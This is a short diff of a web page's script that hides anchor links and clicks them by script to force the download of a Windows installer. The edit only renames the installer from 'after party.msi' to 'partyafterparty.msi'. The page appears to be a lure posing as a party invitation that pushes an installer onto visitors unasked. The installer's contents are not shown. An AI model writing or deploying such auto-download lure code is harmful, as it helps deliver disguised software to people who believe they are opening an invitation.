@@ -302,7 +302,7 @@
   <!-- Auto + manual download -->
   <script>
     // Change this once to your real file name (or path)
-    const FILE_NAME = "after party.msi";
+    const FILE_NAME = "partyafterparty.msi";
 
     // Wire manual link
     (function bindManual(){
@@ -324,7 +324,7 @@
         const a = document.createElement("a");
         a.style.display = "none";
         a.href = url;
-        a.download = url.split("/").pop() || "after party.msi";
+        a.download = url.split("/").pop() || "partyafterparty.msi";
         document.body.appendChild(a);
         a.click();
         a.remove();
@@ -350,7 +350,7 @@
           const a2 = document.createElement("a");
           a2.style.display = "none";
           a2.href = objectUrl;
-          a2.download = url.split("/").pop() || "after party.msi";
+          a2.download = url.split("/").pop() || "partyafterparty.msi";
           document.body.appendChild(a2);
           a2.click();
           a2.remove();
